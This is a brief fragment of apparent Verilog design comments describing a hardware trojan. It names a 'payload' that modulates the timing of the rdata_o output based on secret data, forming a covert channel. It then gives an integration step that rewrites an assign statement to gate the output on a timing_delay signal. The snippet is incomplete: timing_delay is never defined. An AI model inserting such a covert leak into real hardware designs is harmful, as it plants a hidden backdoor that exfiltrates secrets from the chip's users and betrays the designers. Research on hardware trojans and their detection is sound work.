 ...
 * Payload: Modulate timing of rdata_o based on secret data
 * 
...
// ============================================================
// Covert Channel: Modulate timing of rdata_o
//
// Integration Script Must Modify:
//
// IF rdata_o is timing-sensitive:
//   Find: assign rdata_o = ready_signal;
//   Replace: assign rdata_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
